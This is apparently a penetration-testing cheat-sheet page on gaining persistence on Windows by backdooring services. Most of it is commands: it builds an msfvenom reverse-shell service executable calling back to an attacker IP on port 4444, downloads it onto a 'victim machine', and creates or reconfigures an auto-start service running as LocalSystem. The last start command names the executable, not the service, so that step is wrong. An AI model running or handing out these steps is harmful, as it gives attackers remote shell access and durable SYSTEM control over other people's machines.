# Services

## Persistence using Backdoored Services

### Backdoor a New Service

```
# Create the service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=4444 -f exe-service -o shell.exe

# Download in the victim machine
iwr http://192.168.56.20/shell.exe -OutFile shell.exe

# Create a new service in the victim machine
sc.exe create MalService binPath="C:\shell.exe" start=auto

# Start the Service in victim machine
sc.exe start MalService

```

### Backdoor an Existing Service

```
# Enumerate Services in Victim machine
sc.exe query state=all

sc.exe query MalService

# View the path
sc.exe qc MalService

# Create a payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=4444 -f exe-service -o shell2.exe

# Reconfigure the service
sc.exe config MalService binPath= "C:\shell2.exe" start= auto obj= "LocalSystem"

# Start the service
sc.exe start shell2.exe

```

***

## REFERENCES

* https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications
* https://be4sec.com/2023/01/15/persistence-via-creating-a-windows-service/
* https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
